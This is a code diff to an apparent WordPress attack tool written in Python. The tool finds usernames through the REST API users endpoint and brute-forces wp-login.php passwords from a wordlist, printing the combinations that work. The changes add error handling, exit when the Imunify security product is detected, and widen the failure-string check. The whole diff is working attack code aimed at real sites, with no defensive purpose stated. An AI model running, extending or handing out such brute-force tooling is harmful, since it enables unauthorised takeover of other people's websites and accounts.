@@ -32,12 +32,14 @@ class FindUser:
         tar_list = target.split('/')[0]
         url = 'http://' + tar_list
         resp = requests.get(url + '/wp-json/wp/v2/users/1', headers=header)
-
-        uname = resp.json()['name']
-        slug = resp.json()['slug']
-        self.uname = uname
-        hasil = 'slug: '+slug + ' ==> ' +'username: ' + uname
-        self.hasil = hasil
+        try:
+            uname = resp.json()['name']
+            slug = resp.json()['slug']
+            self.uname = uname
+            hasil = 'slug: '+slug + ' ==> ' +'username: ' + uname
+            self.hasil = hasil
+        except:
+            exit('please input the username because tools can\'t detect usename. maybe any html comment')
 ada = []
 def wpbf(url: str, usr='a', pw='a', path='/wp-login.php'):
     target = url
@@ -80,16 +82,16 @@ def wpbf(url: str, usr='a', pw='a', path='/wp-login.php'):
         dataa = r.text
         if r.status_code == 404:
             if 'reset-password' in r.text:
-                exit('Imunify ALert')
+            	exit('Imunify ALert')
             else:
-                exit('\nURL NOT FOUND - STATUS CODE: 404')
+            	exit('\nURL NOT FOUND - STATUS CODE: 404')
             
         count += 1
         if count > len(garis):
               print("\n"+target + " Is Done")
         sys.stdout.write(f'\r{w}Progress: {count}/{len(garis)}')
         time.sleep(0.01)
-        if 'Error' in dataa or 'Incorrect' in dataa or 'Invalid' in dataa:
+        if 'Error' in dataa or 'Incorrect' in dataa or 'Invalid' in dataa or 'ERROR' in dataa:
             pass
         else:
             hasil ='\n' + c + wl + ' Is Valid'
